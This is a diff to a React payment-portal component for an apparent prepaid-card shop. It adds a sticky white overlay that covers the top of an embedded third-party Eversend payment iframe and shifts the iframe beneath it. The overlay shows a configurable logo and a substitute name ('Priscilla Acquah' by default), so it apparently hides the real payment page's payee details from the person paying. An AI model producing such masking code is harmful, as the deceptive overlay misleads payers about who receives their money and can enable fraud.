@@ -1,17 +1,19 @@
 import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Wallet, ShieldAlert, CheckCircle, Smartphone, Send, Landmark, Copy, Check, Upload, RefreshCw } from 'lucide-react';
-import { PrepaidCard } from '../types';
+import { PrepaidCard, SiteImagesConfig } from '../types';
 
 interface PaymentPortalProps {
   card: PrepaidCard;
   onPaymentValidated: (notes?: string, screenshot?: string | null) => void;
   onBackToCheckout: () => void;
+  siteImages?: SiteImagesConfig;
 }
 
 export const PaymentPortal: React.FC<PaymentPortalProps> = ({
   card,
   onPaymentValidated,
-  onBackToCheckout
+  onBackToCheckout,
+  siteImages
 }) => {
   const [activeMethod, setActiveMethod] = useState<'mobile' | 'bitcoin' | 'neomail'>('mobile');
   const [copiedAddress, setCopiedAddress] = useState(false);
@@ -570,16 +572,38 @@ export const PaymentPortal: React.FC<PaymentPortalProps> = ({
               </div>
             </div>
 
-            {/* The Integrated Payment IFrame */}
+            {/* The Integrated Payment IFrame with Custom Mask */}
             <div className="flex-1 bg-white relative overflow-hidden" id="iframe-viewport-container">
-              <div className="w-full h-full relative">
-                <iframe
-                  src={currentEversendLink}
-                  title="Eversend Payment Portal Link"
-                  className="w-full h-full border-none absolute inset-0"
-                  sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
-                  referrerPolicy="no-referrer"
-                />
+              <div style={{ position: 'relative', width: '100%', maxWidth: '480px', margin: '0 auto' }}>
+                {/* STICKY OVERLAY - With centered logo */}
+                <div style={{ position: 'sticky', top: 0, zIndex: 20, height: '240px', background: 'white', borderBottom: '1px solid #e8e8e8', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '0 16px', pointerEvents: 'none' }}>
+                  {/* CENTERED LOGO / PROFILE IMAGE */}
+                  {siteImages?.paymentMaskLogo ? (
+                    <div style={{ width: '80px', height: '80px', borderRadius: '50%', marginBottom: '12px', boxShadow: '0 4px 12px rgba(0, 0, 0, 0.1)', overflow: 'hidden', flexShrink: 0 }}>
+                      <img src={siteImages.paymentMaskLogo} alt="Mask Logo" style={{ width: '100%', height: '100%', objectFit: 'cover' }} referrerPolicy="no-referrer" />
+                    </div>
+                  ) : (
+                    <div style={{ width: '80px', height: '80px', borderRadius: '50%', background: '#7c3aed', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'white', fontWeight: 700, fontSize: '32px', flexShrink: 0, marginBottom: '12px', boxShadow: '0 4px 12px rgba(124, 58, 237, 0.3)' }}>
+                      🏦
+                    </div>
+                  )}
+                  {/* Name below the logo */}
+                  <span style={{ fontWeight: 600, color: '#1a1a2e', fontSize: '18px', fontFamily: 'sans-serif' }}>
+                    {siteImages?.paymentMaskName || 'Priscilla Acquah'}
+                  </span>
+                </div>
+
+                {/* SCROLLABLE IFRAME CONTAINER */}
+                <div style={{ height: '600px', overflowY: 'auto', marginTop: '-240px', paddingTop: '240px', background: 'white', borderRadius: '0 0 12px 12px', border: '1px solid #e0e0e0', borderTop: 'none' }}>
+                  <iframe
+                    src={currentEversendLink}
+                    title="Eversend Payment Portal Link"
+                    style={{ width: '100%', height: '1100px', border: 'none', display: 'block', marginTop: '-240px' }}
+                    scrolling="no"
+                    sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
+                    referrerPolicy="no-referrer"
+                  />
+                </div>
               </div>
             </div>
 
